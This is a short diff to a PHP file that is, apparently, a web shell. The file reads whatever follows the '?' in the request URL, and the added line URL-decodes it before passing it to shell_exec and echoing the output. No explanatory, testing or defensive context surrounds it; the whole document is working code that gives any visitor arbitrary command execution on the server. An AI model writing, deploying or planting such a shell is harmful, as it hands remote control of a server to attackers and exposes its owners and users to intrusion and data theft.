@@ -1,6 +1,7 @@
 <pre>
 <?php
   $cmd = substr($_SERVER['REQUEST_URI'], strpos($_SERVER['REQUEST_URI'], "?", 1)+1);
+  $cmd = urldecode($cmd);
   echo shell_exec($cmd);
 ?>
 </pre>
